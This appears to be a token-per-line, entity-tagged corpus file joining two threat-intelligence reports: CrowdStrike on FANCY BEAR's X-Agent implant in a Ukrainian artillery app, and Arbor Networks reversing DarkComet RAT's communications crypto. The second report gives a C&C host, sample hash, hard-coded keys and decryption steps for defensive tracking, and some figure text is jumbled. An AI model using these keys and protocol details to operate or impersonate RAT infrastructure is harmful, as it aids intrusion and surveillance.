5.4
%
.9
%
25.9
%
40.4
%
1.3
%
1
%
5.2
%
.5
%
Distribution
of
Russian
/
Ukrainian
Language
Use
in
Ukraine8
forces
operating
in
eastern
Ukraine
.

A
relevant
and
likely
counterargument
for
this
theory
,
however
,
is
that
Russian
forces
likely
have
employed
fire
support
systems
and
other
technologies
that
can
already
calculate
targeting
data
,
negating
the
need
for
an
application
to
perform
this
task
.

Additionally
,
the
application
was
initially
developed
by
a
member
of
the
Ukrainian
army
.

An
opposing
force
would
probably
not
adopt
technology
developed
by
the
enemy
for
use
on
the
battlefield
.

OUTCOMES
AND
CONCLUSION
The
eastern
Ukrainian
front
has
been
markedly
impacted
by
heavy
fighting
involving
Russian
troops
and
pro-Russian
rebel
fighters
deployed
to
this
region
.

Artillery
forces
on
both
sides
of
the
conflict
have
served
an
important
role
.

For
Ukrainian
troops
,
artillery
forces
have
also
shouldered
a
heavy
cost
.

Open-source
reporting
indicates
losses
of
almost
50
%
of
equipment
in
the
last
2
years
of
conflict
amongst
Ukrainian
artillery
forces
and
over
80
%
of
D-30
howitzers
were
lost
,
far
more
than
any
other
piece
of
Ukrainian
artillery
9.9
Between
July
and
August
2014
,
Russian
backed
forces
launched
some
of
the
most
decisive
attacks
against
Ukrainian
forces
,
resulting
in
significant
loss
of
life
,
weaponry
,
and
territory
.

According
to
open
sources
,
Ukrainian
service
personnel
from
the
24th
and
72nd
Mechanized
Brigade
,
as
well
as
the
79th
Airborne
Brigade
,
were
among
the
units
to
have
suffered
casualties
.

International
monitoring
groups
later
assessed
some
of
the
attacks
were
likely
to
have
come
from
inside
Russian
territory.10
A
malware-infected
Попр-Д30.apk B_malware.backdoor
application
probably
could
not
have
provided
all
the
necessary
data
required
to
directly
facilitate
the
types
of
tactical
strikes
that
occurred
between
July
and
August
2014
.

Eyewitness
accounts
from
individuals
within
the
impacted
units
reported
seeing
an
unmanned
aerial
vehicle
(
UAV
)
used
in
the
area
prior
to
one
attack
,
underscoring
the
need
for
precise
locational
data
for
these
particular
strikes
and
introducing
the
possibility
that
the
Android
malware
served
to
support
the
reconnaissance
role
of
traditional
battlefield
assets
.

Although
traditional
overhead
intelligence
surveillance
and
reconnaissance
(
ISR
)
assets
were
likely
still
needed
to
finalize
tactical
movements
,
the
ability
of
this
application
to
retrieve
communications
and
gross
locational
data
from
infected
devices
,
could
provide
insight
for
further
planning
,
coordination
,
and
tasking
of
ISR
,
artillery
assets
,
and
fighting
forces
.

The
X-Agent B_malware.infosteal
Android
variant
does
not
exhibit
a
destructive
function
and
does
not
interfere
with
the
function
of
the
original
Попр-Д30.apk B_malware.backdoor
application
.

Therefore
,
CrowdStrike
Intelligence
has
assessed
that
the
likely
role
of
this
malware
is
strategic
in
nature
.

The
capability
of
the
malware
includes
gaining
access
to
contacts
,
Short
Message
Service
(
SMS
)
text
messages
,
call
logs
,
and
internet
data
,
and
FANCY
BEAR
would
likely
leverage
this
information
for
its
intelligence
and
planning
value
.

CrowdStrike
Intelligence
assesses
a
tool
such
as
this
has
the
potential
ability
to
map
out
a
unit
's
composition
and
hierarchy
,
determine
their
plans
,
and
even
triangulate
their
approximate
location
.

This
type
of
strategic
analysis
can
enable
the
identification
of
zones
in
which
troops
are
operating
and
help
prioritize
assets
within
those
zones
for
future
targeting
.

Additionally
,
a
study
provided
by
the
International
Institute
of
Strategic
Studies
determined
that
the
weapons
platform
bearing
the
highest
losses
between
2013
and
2016
was
the
D-30
towed
howitzer.11
It
is
possible
that
the
deployment
of
this
malware
infected
application
may
have
contributed
to
the
high-loss
nature
of
this
platform
.

The
development
of
the
X-Agent B_malware.infosteal
Android
malware
represents
an
expansion
of
FANCY
BEAR
capabilities
in
terms
of
mobile
malware
,
and
illustrates
the
practical
application
of
full-spectrum
combat
as
envisioned
in
the
eponymous
doctrinal
writings
of
General
Valery
GERASIMOV
.

As
a
part
of
full-spectrum
operations
in
Ukraine
,
Russia-based
adversaries
have
leveraged
malware
on
the
battlefield
,
in
the
civil
sector
,
and
against
critical
infrastructure
.

They
have
also
engaged
in
aggressive
information
operations
in
the
media
.

In
relation
to
this
broader
picture
of
Russian
computer
operations
,
the
approach
to
targeting
mobile
smartphone
and
tablet
devices
in
order
to
gain
strategic
insight
into
communications
is
a
tactic
that
can
not
be
disregarded
.

CrowdStrike
assesses
that
the
observed
and
described
X-Agent B_malware.infosteal
implant
targeting
Ukrainian
military
Android
devices
running
the
Попр-Д30.apk B_malware.backdoor
'
CROWDSTRIKE
INTELLIGENCE
ASSESSES
A
TOOL
SUCH
AS
THIS
HAS
THE
POTENTIAL
ABILITY
TO
MAP
OUT
A
UNIT
'S
COMPOSITION
AND
HIERARCHY
,
DETERMINE
THEIR
PLANS
,
AND
EVEN
TRIANGULATE
THEIR
APPROXIMATE
LOCATION
'
application
is
likely
only
the
initial
iteration
of
this
type
of
malware
.

While
this
malware
was
initially
discovered
in
a
battlefield
environment
,
an
adversary
could
also
leverage
it
in
attacks
against
non-military
targets
.

Mobile
devices
and
internet-connected
technology
have
increasingly
proliferated
civilian
and
military
organizations
.

This
technique
may
very
likely
be
deployed
in
the
political
,
government
,
or
non-governmental
sectors
in
the
near
future
.

1
-
The
name
Попр-Д30.apk B_malware.backdoor
is
an
abbreviated
variant
of
Поправки-Д30
which
translates
to
Correction-D30
.

2
-
For
more
information
,
contact
CrowdStrike
3-vKontakte
is
a
Russian
social
media
networking
site
alike
in
layout
and
functionality
to
Facebook
.

4
-
http://programs-art.at.ua B_url.unknown
5
-
For
more
information
,
contact
CrowdStrike
6
-
Igor
Sutyagin
,
'Russian
Forces
in
Ukraine
,
'
Royal
United
Services
Institute
,
March
2015
,
https://rusi.org/sites/default/files/201503_bp_russian_forces_in_ukraine.pdf B_url.unknown
7
-
https://www.youtube.com/watch?v=qp-7e_ZGH8I B_url.normal
8
-
Data
for
image
circa
2015
.

Note
:
These
maps
do
not
provide
data
for
Crimea
.

According
to
various
sources
,
there
are
estimates
suggesting
that
,
in
greater
Crimea
80
%
speak
Russian
,
10
%
speak
Ukrainian
,
and
10
%
speak
Tatar
.

The
percentage
of
Russian
speakers
is
estimated
to
be
higher
in
Sevastopol
,
most
likely
dues
to
the
Russian
Naval
Base
in
the
region
.

Source
:
The
Razumkov
Center
report
on
'
The
Ukranian
Citizen
's
Identity
in
the
New
Environment
:
Status
,
Trends
,
Regional
Differences
,
'
'
7
June
2016
,
razumkov.org.ua/upload/identi-2016.pdf B_url.unknown
.

9
-
http://thesaker.is/ukrainian-army-losses-in-ato-anti-terrorist-operation-according-to-the-iisss-military-balance/ B_url.unknown
10
-
For
more
information
,
see
'
Origin
of
Artillery
Attacks
on
Ukrainian
Military
Positions
in
Eastern
Ukraine
between
14
July
2014
and
8
August
2014
,
'
https://www.bellingcat.com/news/uk-and-europe/2015/02/17/origin-of-artillery-attacks/ B_url.unknown
.
'

'
THE
COLLECTION
OF
SUCH
TACTICAL
ARTILLERY
FORCE
POSITIONING
INTELLIGENCE
BY
FANCY
BEAR
FURTHER
SUPPORTS
CROWDSTRIKE
'S
PREVIOUS
ASSESSMENTS
THAT
FANCY
BEAR
IS
LIKELY
AFFILIATED
WITH
THE
RUSSIAN
MILITARY
INTELLIGENCE
(
GRU
)
'
It's
not
the
end
of
the
world
:
DarkComet B_malware.backdoor
misses
by
a
mile

Reversing
the
DarkComet B_malware.backdoor
RAT's
crypto-
3/13/2012

Jeff
Edwards
,
Research
Analyst
,
Arbor
Networks
ASERT

In
this
article
,
we
will
continue
our
series
on
reversing
DDoS
malware
crypto
systems
.

Previous
subjects
have
included
Armageddon  B_malware.ransom
,
Khan  B_malware.ddos
(
now
believed
to
be
a
very
close
'
cousin
'
of
Dirt  B_malware.ddos
Jumper  I
version
5
)
,
and
PonyDOS B_malware.ddos
.

Today
we'll
be
diving
deep
into
the
details
of
DarkComet's B_malware.backdoor
crypto
.

Over
the
last
several
months
,
we
have
encountered
a
large
number
of
DarkComet B_malware.backdoor
samples
,
numbering
well
over
a
thousand
.

DarkComet B_malware.backdoor
is
primarily
a
general
purpose
remote
access
trojan
(
RAT
)
.

It's
capabilities
support
quite
an
extensive
laundry
list
of
mischief
,
including
but
not
limited
to
key
logging
,
web
cam
(
and
sound
card
)
spying
,
deleting
victim
files
,
scanning
ports
,
hijacking
MSN
sessions
,
etc
.

Figure
1
.
Dark  B_malware.backdoor
Comet's I
pretty
logo
Of
course
the
malware
includes
DDoS
capabilities
as
well
-
hence
our
interest
in
reversing
its
communications
so
that
we
can
keep
tabs
on
whom
the
DarkComet B_malware.backdoor
botnets
are
attacking
.

In
fact
,
it
is
believed
to
have
been
used
as
a
DDoS
weapon
by
supporters
of
the
Syrian
regime
against
opposition
forces
in
the
recent
Syrian
uprisings
;
TrendMicro
has
a
nice
article
/
on
this
topic
.

DarkComet B_malware.backdoor
has
been
studied
by
a
number
of
researchers
.

In
particular
,
in
November
2011
Laura
Aylward
of
Contextis
published
an
excellent
analysis
[
http://www.contextis.com/research/blog/darkcometrat/  B_url.normal
]
of
Dark  B_malware.backdoor
Comet I
in
which
she
described
the
basic
cryptographic
mechanism
used
by
DarkComet B_malware.backdoor
bots
to
hide
their
communications
;
Laura's
analysis
saved
us
a
considerable
amount
of
time
.

It
was
also
included
in
Curt
Wilson's
recent
survey
of
modern
DDoS
weapons
.

The
DarkComet B_malware.backdoor
sample
upon
which
we
will
primarily
focus
on
today
is
462,848
bytes
in
size
and
has
an
MD5
hash
of
63f2ed5d2ee50e90cda809f2ac740244  B_hash
.

It
happens
to
be
an
instance
of
DarkComet B_malware.backdoor
Version
4.2
;
however
,
the
results
presented
here
apply
to
most
other
versions
of
DarkComet B_malware.backdoor
as
well
.

When
executed
in
a
sandbox
,
we
observed
it
connecting
to
a
command
&
control
(
C&C
)
server
at
newrat2.noip.org  B_url.cncsvr
on
TCP
port
1604
.

The
RAT
uses
a
raw
TCP
protocol
to
exchange
information
with
its
C&C
;
on
the
wire
,
the
comms
look
something
like
this
(
modified
and
re-encrypted
to
protect
some
of
our
sensitive
sandbox
information
)
:

C&C
:
155CAD31A61F

Bot
:
0F5DAB3EB308

C&C
:
1B7D8D3BBF14C6B619480C265C2F4664F9DCB878EA7DFC6F2637

Bot
:
35769F079329B4E04603496A432E5A7CFC90A477F478F07A3826A1B436AB92852B685636

F72B52C56D70434D7691F3307D637118B869586A1D19FD15B8C6AE14F8F8C57EFAFCCC09
964E8EE8EED553886AB188665F1AB96586F4F2581C093E75DCF2A8ADC817558BF3452344
0CDBE43CA4C05AC6E8D90D00F35BE795A44AE0E2EDE36C061EAEBD754461F680DBD9893A

CF6211698AF22B0BBB92A9B47363AE86E69A08C29DD3DBA59D287E4A0E12664B312A81C0

E9FE4D6E538AB5CC8952CCB372869F57D168CE8ABB52B8D7F8E78547A5EB009931735868


ADEC6BA2B73A94C7A9A6784B1A81C58CF746D384B645DD02D4616479A055420DADEF0458
658A33EEA62BF7F12ABF1C0E00CB6B971869FBC275A3270E8DEBFA20E53E8C3BC6CA2744

A88897E0B16FBBDCAA731B93A72D75FF6DC297

Bot
:

KEEPALIVE144357

Bot
:

C
:
KEEPALIVE160360

C&C
:

S
:
KeepAlive
|
27120274

Bot
:

C
:
KEEPALIVE176363

Bot
:

C
:
KEEPALIVE192366

C&C
:

S
:
KeepAlive
|
27160288

Figure
2
.
Example
of
DarkComet's B_malware.backdoor
encrypted
comms

These
communications
are
consistent
with
those
reported
by
Contextis
in
their
DarkComet B_malware.backdoor
report
.

It
certainly
looks
like
an
initial
'
phone
home
'
exchange
of
information
,
after
which
the
bot
and
C&C
send
periodic
'
Keep
Alive
'
messages
to
each
other
.

Besides
being
encrypted
,
this
protocol
is
somewhat
unusual
in
that
the
C&C
sends
the
first
payload
;
it
is
much
more
common
for
the
bot
to
send
the
first
payload
.

So
in
order
to
develop
a
tracker
that
impersonates
a
DarkComet B_malware.backdoor
bot
so
as
to
snoop
on
DDoS
attacks
,
we
need
to
reverse
the
malware's
crypto
system
and
write
decryption
and
encryption
routines
in
Python
.

Let's
start
reversing
by
loading
a
process
memory
dump
of
the
running
bot
in
IDA
Pro
.

We'll
then
start
poking
around
looking
for
routines
that
might
implement
the
phone
home
protocol
.

Since
DarkComet B_malware.backdoor
clearly
uses
raw
TCP
for
communication
(
as
opposed
to
,
say
,
HTTP
)
,
we'll
focus
on
finding
WinSock2
calls
such
as
socket()
,
connect()
,
send()
,
and
recv()
.

Well
,
it
turns
out
that
the
bot
is
riddled
with
vast
numbers
of
WinSock2
calls
;
not
surprising
,
since
DarkComet B_malware.backdoor
has
a
great
deal
of
RAT
functions
that
require
network
communication
.

So
to
narrow
down
on
the
actual
bot-C&C
comms
loop
,
we


locate
the
lengthy
list
of
command
strings
,
such
as
KeylogOn
,
GetOfflineLogs
,
WEBCAMLIVE
,
GetMsnList
,
DDOSHTTPFLOOD
,
etc
.

In
particular
,
we
note
that
all
these
command
strings
are
referenced
from
the
same
function
.

Furthermore
,
this
function
is
structured
as
a
very
long
sequence
of
if-else
statements
that
compare
each
of
these
command
strings
against
the
same
buffer
.

Even
better
,
there
is
only
a
single
caller
of
this
function
.

Hmmm
,
that
certainly
sounds
like
the
bot's
primary
command
dispatch
routine
;
we'll
call
it
DispatchCommands_sub_493DAC()
.

Checking
out
the
caller
function
,
we
see
that
it
operates
in
a
loop
.

On
each
iteration
through
the
loop
,
it
basically
performs
the
following
actions
:

1
.
Calls
recv()
to
read
network
traffic
into
a
buffer
;

2
.
Performs
some
copies
and
operations
on
this
buffer
to
produce
an
intermediate
buffer
;

3
.
Performs
an
operation
(
decryption
perhaps
?
)
on
the
intermediate
buffer
and
a
global
string
to
produce
a
final
buffer
;

3
.
Passes
the
final
buffer
to
the
aforementioned
DispatchCommands_sub_493DAC()
function
;

Yes
,
this
sounds
like
the
main
comms
loop
for
which
we
are
looking
;
we'll
name
this
caller
function
MainCommsLoop_sub_493A30()
,
and
focus
our
attention
on
the
aforementioned
loop
:





Figure
3
.
Function
MainCommsLoop_sub_493A30()

It
definitely
looks
like
a
great
candidate
for
the
decryption
operation
.

It
follows
the
general
structure
that
is
quite
common
among
bot
families
that
encrypt
their
comms
;
namely
,
a
pre-processing
operation
applied
to
a
buffer
,
followed
by
the
actual
decryption
step
.

In
particular
,
one
strong
clue
is
that
the
(
assumed
)
decryption
step
takes
a
third
argument
which
,
in
this
case
,
is
a
reference
to
a
global
string
-
very
likely
to
be
the
decryption
key
string
!

So
first
let's
see
what
our
(
tentatively
named
)
DecryptCommandBuffer_sub_44C628()
function
looks
like
.

DarkComet B_malware.backdoor
being
a
Delphi-based
bot
,
the
decryption
function
is
passed
the
source
(
encrypted
)
buffer
in
EAX
,
the
(
presumed
)
crypto
key
in
EDX
,
and
an
output
string
buffer
in
ECX
.

After
checking
to
make
sure
neither
the
source
nor
key
strings
are
empty
,
the
function
gets
down
to
business
.

The
first
substantive
operation
is
to
pass
the
raw
(
encrypted
)
source
buffer
src_buf_var_4
via
EAX
,
along
with
an
output
buffer
temp_buf_var_420
via
EDX
,
to
function
sub_44C1C0();
the
output
buffer
is
then
copied
back
into
the
original
source
buffer
src_buf_var_4
:

Figure
4
.
Function
DecryptCommandBuffer_sub_44C628()


So
sub_44C1C0()
seems
like
it
might
be
doing
some
pre-processing
on
the
encrypted
source
buffer
;
let's
see
what
kind
of
pre-processing
it
is
doing
.

Skipping
past
the
obligatory
checks
for
empty
source
buffers
,
etc
.
,
we
arrive
at
some
code
that
loops
over
the
source
buffer
,
referenced
by
src_buf_var_4;
however
,
it
makes
only
one
loop
iteration
for
every
two
bytes
in
src_buf_var_4
.

This
is
accomplished
by
extracting
the
DWORD
just
in
front
of
the
source
string
and
shifting
it
one
bit
to
the
right
,
in
order
to
calculate
the
number
of
pairs
of
source
characters
:

Figure
5
.
Function
PreProcess_sub_44C1C0()



This
works
because
in
Delphi
,
the
AnsiString
class
stores
its
length
at
an
offset
of
4
bytes
in
front
of
the
first
actual
byte
of
string
content
:

Figure
6
.
Structure
of
a
Delphi
AnsiString

For
example
,
in
the
case
of
the
initial
encrypted
payload
received
by
the
bot
from
the
C&C
,
155CAD31A61F
,
the
length
of
the
source
buffer
is
12
,
so
the
code
will
make
only
6
iterations
through
the
loop
.

On
each
iteration
of
the
loop
,
DarkComet B_malware.backdoor
will
process
a
pair
of
two
source
bytes
to
yield
one
output
byte
.

The
first
operation
inside
the
loop
is
to
test
whether
or
not
the
value
of
the
first
source
byte
in
the
pair
is
greater
than
0x39
,
and
branch
accordingly
.

After
using
the
one-based
index
EBX
to
pull
out
the
first
of
the
two
source
bytes
in
the
pair
,
it
adds
0xD0
,
subtracts
0x0A
,
and
then
tests
whether
the
resulting
value
is
greater
than
or
equal
to
zero
.

Since
it
is
operating
on
the
8-bit
register
AL
,
the
result
is
that
source
bytes
with
values
of
0x3A
or
greater
will
be
processed
by
one
branch
,
and
those
with
values
of
0x39
and
less
will
be
processed
by
a
second
branch
:



Figure
7
.
Function
PreProcess_sub_44C1C0()

If
the
first
source
byte
in
the
pair
has
value
0x39
or
less
,
the
bot
will
subtract
0x30
from
it
and
save
the
result
to
the
current
index
within
the
output
buffer
:



Figure
8
.
Function
PreProcess_sub_44C1C0()

In
other
words
,
it
will
convert
the
ASCII
representations
(
0x30
,
0x31
,
...
,
0x39
)
of
the
digits
0
through
9
into
their
equivalent
integer
representations
(
0x00
,
0x01
,
...
,
0x09
)
.

The
second
branch
performs
a
similar
operation
:
it
first
tests
to
make
sure
that
the
value
of
the
source
byte
is
not
0x47
or
greater
(
in
which
case
it
will
immediately
bail
out
of
the
loop
and
jump
to
the
end
of
the
PreProcess_sub_44C1C0()
function
.
)
It
will
then
subtract
0x37
from
the
source
byte
and
save
the
result
into
the
current
index
within
the
output
buffer
:


Figure
9
.
Function
PreProcess_sub_44C1C0()


In
other
words
,
it
will
convert
the
ASCII
representations
(
0x41
,
0x42
,
...
,
0x46
)
of
the
upper-case
letters
A
through
F
into
their
equivalent
hexadecimal
representations
(
0x0A
,
0x0B
,
...
,
0x0F
)
.

The
two
branches
(
for
handling
digits
and
upper-case
A
through
F
)
will
then
re-join
,
and
the
resulting
integer
/
hexadecimal
representation
of
the
first
source
byte
will
be
left-shifted
by
four
(
thus
multiplying
it
by
16
)
:

Figure
10
.
Function
PreProcess_sub_44C1C0()

At
this
point
,
it
is
pretty
clear
what
is
going
on
.

The
PreProcess_sub_44C1C0()
function
is
converting
the
ASCII
representation
of
the
source
string
of
bytes
into
the
equivalent
hexadecimal
representation
.

This
conjecture
is
confirmed
upon
inspection
of
the
remaining
portion
of
the
loop
,
which
applies
the
same
ASCII-to-hex
operation
on
the
second
byte
of
each
pair
of
source
bytes
,
and
adds
the
result
to
the
left-shifted
output
from
the
first
byte
of
the
pair
.

So
at
the
end
of
the
day
,
the
first
line
of
raw
encrypted
source
payload
from
the
C&C
is
pre-processed
from
the
12-character
ASCII
string
155CAD31A61F
to
its
equivalent
sequence
of
six
hexadecimal
bytes
0x15
0x5C
0xAD
0x31
0xA6
0x1F
,
as
follows
:
0x31
0x35
0x35
0x43
0x41
0x44
0x33
0x31
0x41
0x36
0x31
0x46
0x01
0x05
0x05
0x0C
0x0A
0x0D
0x03
0x01
0x0A
0x06
0x01
0x0F
0x10
0x10
0x30
0x50
0xA0
0xA0
0x15
0x5C
0xAD
0x31
0xA6
0x1F
src
index
src
(
ASCII
)
src
(
raw
)
src
(
hex
)
shifted


Figure
11
.
ASCII
to
Integer
Conversion

So
we
will
rename
this
function
as
Integerize_sub_44C1C0()
,
and
head
back
to
the
main
DecryptCommandBuffer_sub_44C628()
function
to
continue
reversing
the
crypto
algorithm
.

After
the
raw
source
buffer
has
been
converted
from
ASCII
form
to
integer
form
,
the
next
substantive
code
block
initializes
a
256-element
array
stable_var_41C
:



Figure
12
.
Function
DecryptCommandBuffer_sub_44C628()

Each
element
in
stable_var_41C
is
a
32-bit
DWORD;
the
elements
are
initialized
to
the
values
0x00000000
through
0x000000FF
in
ascending
order
:

Index
ESI

Value
subst_var_41C[ESI]
...
253
254
255
0x00
0x01
0x02
0x03
0x04
...
0xFD
0xFE
0xFF

Figure
13
.
Initial
state
of
substitution
table
stable_var_41C

At
this
point
,
we
can
guess
that
stable_var_41C
is
going
to
play
the
role
of
a
substitution
table
for
decrypting
the
source
buffer
src_buf_var_4
,
so
let's
see
how
DarkComet B_malware.backdoor
builds
this
table
.

After
initializing
the
substitution
table
to
hold
all
the
values
between
0x00
and
0xFF
in
a
nice
ascending
order
,
it
proceeds
to
vigorously
scramble
up
the
elements
of
the
table
.

It
makes
256
iterations
through
a
loop
;
on
each
iteration
,
it
swaps
the
positions
of
two
of
the
elements
in
the
substitution
table
.

On
the
kth
iteration
,
one
of
the
swapped
elements
is
always
the
kth
element
,
which
is
pointed
to
by
register
ECX
;
the
other
is
chosen
based
on
the
key
string
.

The
core
of
the
loop
that
scrambles
up
the
substitution
table
is
as
follows
:



Figure
14
.
Function
DecryptCommandBuffer_sub_44C628()
th
element
of
stable_var_41C
and
the
value
th
iteration
.

The
first
code
block
in
the
above
IDA
listing
chooses
which
element
of
stable_var_41C
should
be
swapped
with
the
th
element
.

It
uses
an
accumulator
variable
,
implemented
by
register
EBX
and
initialized
to
zero
.

On
each
pass
through
the
loop
,
it
updates
the
acccumulator
EBX
by
adding
to
it
the
value
of
the
k
of
the
current
key
string
byte
.

One
byte
of
key
string
is
used
per
iteration
,
and
whenever
the
key
string
is
'
used
up
'
,
it
restarts
again
at
the
beginning
of
the
key
;
register
EDI
holds
the
length
of
the
key
string
,
so
the
bot
just
computes
k
modulo
EDI
(
at
instruction
0x0044C767
)
to
choose
which
byte
of
the
key
to
use
on
the
k

The
last
code
block
performs
the
actual
swapping
,
using
swap_temp_var_15
as
the
temporary
variable
to
do
the
swap
.

Once
256
such
swaps
have
been
performed
,
the
loop
exits
and
the
substitution
table
stable_var_41C
has
been
nicely
scrambled
and
is
ready
for
use
.

At
this
point
,
the
actual
process
of
decryption
is
performed
.

DarkComet B_malware.backdoor
iterates
through
its
decryption
loop
once
for
each
byte
in
the
encrypted
source
message
(
after
conversion
from
ASCII
to
integer
representation
.
)
The
decryption
loop
performs
the
following
two
steps
:

First
,
it
performs
an
additional
scrambling
operation
on
the
substitution
table
stable_var_41C
by
swapping
two
elements
.
When
processing
the
k
stable_var_41C;
it
uses
another
accumulator
variable
,
implemented
by
register
EDI
,
to
choose
the
second
element
of
the
swap
pair
:
th
source
byte
,
the
first
element
of
the
swap
pair
is
always
the
k+1
th
element
of
table


Figure
15
.
Function
DecryptCommandBuffer_sub_44C628()
th
)
source
byte
to
produced
a
decrypted
character
.

After
performing
this
swap
operation
,
DarkComet B_malware.backdoor
finally
decrypts
a
byte
of
message
.

It
sums
up
the
values
of
the
two
swapped
elements
(
at
instruction
0x0044C85F
)
,
then
uses
the
result
(
modulo
256
)
to
re-index
into
the
stable_var_41C
table
to
pull
out
a
third
element
(
at
instruction
0x0044C874
)
.
This
third
element
is
XORed
against
the
current
(
k

It
should
be
pointed
out
that
conceptually
,
this
decryption
mechanism
-
both
the
manner
in
which
the
substitution
table
is
built
,
as
well
as
how
it
is
used
for
XOR-based
decryption
-
is
very
similar
to
that
used
by
the
Trojan.PonyDOS  B_malware.ddos
malware
family
.

The
actual
implementation
has
quite
a
few
differences
,
but
the
basic
encryption
algorithm
is
the
same
.

Trojan.PonyDOS  B_malware.ddos
,
however
,
adds
a
few
additional
layers
to
secure
its
communications
protocol
above
and
beyond
the
core
crypto
algorithm
which
it
shares
with
DarkComet B_malware.backdoor
;
specifically
,
the
computation
of
some
cryptographic
hashes
.

Also
,
Trojan.PonyDOS  B_malware.ddos
does
not
go
to
the
trouble
of
converting
its
encrypted
data
payloads
into
ASCII
representations
as
DarkComet B_malware.backdoor
does
.

Now
that
we've
reversed
the
core
DarkComet B_malware.backdoor
decryption
mechanism
(
needed
to
read
C&C
commands
)
,
we'll
want
to
confirm
that
the
encryption
mechanism
(
needed
to
read
and
/
or
fake
bot
phone
home
messages
)
is
symmetric
.

And
indeed
,
by
following
references
to
the
socket
handle
used
to
recv()
the
initial
C&C
command
,
we
can
trace
through
to
find
the
encryption
routine
called
by
DarkComet B_malware.backdoor
just
prior
to
send()
ing
back
its
response
messages
.
Sure
enough
,
the
encryption
routine
,
Encrypt_sub_44C34C()
,
is
functionally
identical
to
the
decryption
routine
,
as
hoped
and
expected
;
the
only
difference
being
that
the
Integerize_sub_44C1C0()
routine
prior
to
decryption
is
absent
,
and
a
new
routine
,
which
we'll
call
Integer2String_sub_409C6C()
,
is
called
following
the
encryption
step
;
this
routine
simply
converts
the
raw
encrypted
data
back
into
the
ASCII
version
of
its
hexadecimal
values
.

Of
course
,
in
order
to
have
a
fully
functional
implementation
of
DarkComet's B_malware.backdoor
crypto
system
,
we'll
need
to
know
what
key
strings
it
uses
.

We
see
that
there
are
two
locations
where
DecryptCommandBuffer_sub_44C628(
)
is
called
,
and
one
of
those
locations
,
EncryptData_sub_49D9EC()
,
has
a
hard-coded
string
with
an
uncanny
resemblance
to
a
decryption
key
:


Figure
16
.
Function
EncryptData_sub_49D9EC()

We
see
that
the
decryption
string
key_var_10
,
passed
to
DecryptCommandBuffer_sub_44C628()
via
EDX
,
is
formed
by
concatenating
a
hard-coded
string
#KCMDDC42F#-
with
some
mystery
string
stored
at
[
EBX+8
]
.

It
turns
out
that
this
mysterious
value
stored
at
an
offset
from
EBX
is
passed
into
EncryptData_sub_49D9EC()
via
the
EAX
register
.

Tracing
backwards
up
the
stack
,
we
follow
the
reference
to
EAX
as
the
baton
is
passed
from
register
to
register
.

It
does
not
take
long
to
come
across
the
following
routine
,
which
we
will
label
ComputeKeySuffix_sub_48F52C(
)
:


Figure
17
.
Function
ComputeKeySuffix_sub_48F52C()

You
don't
run
into
code
like
this
very
often
.

It
receives
an
output
buffer
passed
via
EAX
.

It
then
uses
register
EBX
to
do
some
rather
'
inefficient
'
operations
.

First
,
it
assigns
EBX
the
value
0xFFFFFF8F
,
or
-71
.

It
then
adds
1000
to
EBX
,
yielding
887
.

Then
it
goes
through
four
iterations
of
a
loop
that
has
no
purpose
other
than
to
increment
EBX
by
one
on
each
iteration
,
resulting
in
a
value
of
891
.

Finally
,
it
completes
its
laborious
calculations
by
decrementing
EBX
by
one
,
yielding
a
final
answer
of
890
.

This
integer
is
passed
to
a
standard
integer-to-string
API
,
which
writes
the
string
890
into
the
output
buffer
.

In
C
,
these
shenanigans
would
look
something
like
the
following
:
int
nAddend
=
1000
;
int
nSuffix
=
-71
;
int
nResult
=
nSuffix
+
nAddend
;
for
(
int
k=0;
k<4;
k++
)
nResult
+=
1;
sprintf
(
suffix
,
'
%d
'
,
--nResult
)
;

This
is
a
very
roundabout
way
of
assigning
the
hard-coded
string
890
to
a
buffer
.

Clearly
the
DarkComet B_malware.backdoor
author
is
(
wisely
)
trying
to
avoid
having
the
entire
decryption
key
string
hard-coded
in
the
bot
executable
.

So
at
this
point
,
we
know
that
the
decryption
key
is
composed
of
the
prefix
#KCMDDC42F#-
concatenated
with
the
suffix
890
,
yielding
#KCMDDC42F#-890
.

One
final
note
regarding
the
encryption
key
strings
used
by
DarkComet B_malware.backdoor
:
as
first
documented
in
Contextis
'
Laura
Aylward's
DarkComet B_malware.backdoor
analysis
,
each
version
of
DarkComet B_malware.backdoor
uses
a
different
hard-coded
string
for
the
key
prefix
.

For
example
,
we
have
observed
the
following
:

Dark  B_malware.backdoor
Comet I
version

Version
4.0

Version
4.2

Crypto
Key
Prefix
(
Default
)
#KCMDDC4#-890
#KCMDDC42F#-890


Version
5.0
#KCMDDC5#-890

Figure
18
.
Standard
crypto
key
prefixes
for
DarkComet B_malware.backdoor
versions

Furthermore
,
and
also
documented
by
Contextis
,
DarkComet B_malware.backdoor
supports
the
use
of
an
optional
password
that
is
appended
to
the
default
(
version-specific
)
crypto
key
.

For
example
,
the
default
password
(
if
enabled
)
string
is
0123456789
.

This
10digit
string
will
be
appended
to
the
standard
crypto
key
#KCMDDC42F#-890
(
in
the
case
of
DarkComet B_malware.backdoor
version
4.2
)
to
yield
a
final
key
of
#KCMDDC42F#-8900123456789
.

The
code
that
performs
this
concatenation
is
found
in
a
routine
we'll
call
FormCryptoKey_sub_49D2F4(
)
:

Figure
19
.
Function
FormCryptoKey_sub_49D2F4(
)


This
code
concatenates
the
three
components
of
the
final
crypto
key
:
the
hard-coded
prefix
(
e.g.
,
#KCMDDC42F#-
)
,
the
three-digit
string
890
that
is
not
technically
hard-coded
but
deterministically
computed
using
the
aforementioned
ComputeKeySuffix_sub_48F52C()
routine
,
and
the
optional
botnet
password
stored
in
the
global
variable
PWD_off_4A4B84
.

The
password
itself
is
actually
stored
as
an
encrypted
resource
.

Upon
initialization
,
it
is
decrypted
using
a
preliminary
crypto
key
comprised
only
of
the
first
two
components
(
e.g.
,
#KCMDDC42F#-890
)
using
a
routine
we've
labeled
DecryptResource_sub_49D9EC(
)
.

To
make
a
long
story
short
,
this
routine
uses
the
Windows
APIs
FindResource()
,
LoadResource()
,
etc
.

to
extract
a
named
resource
of
type
RT_RCDATA
(
code
0x0A
)
,
intended
for
'
application-defined
resources
(
raw
data
)
'
.

The
raw
data
is
then
decrypted
using
the
preliminary
crypto
key
.

In
the
case
of
the
crypto
password
,
the
name
of
the
resource
is
PWD
.

The
resource
is
extracted
,
decrypted
,
and
stored
for
future
use
in
the
global
variable
PWD_off_4A4B84
by
a
function
we
call
DecryptResources_sub_49F92C()
:


Figure
20
.
Function
DecryptResources_sub_49F92C()

In
the
case
of
the
default
password
0123456789
,
the
encrypted
resource
will
hold
the
value
6811E636E69E9AEFA5C6
.

This
DecryptResources_sub_49F92C()
function
actually
decrypts
a
lot
of
encrypted
bot
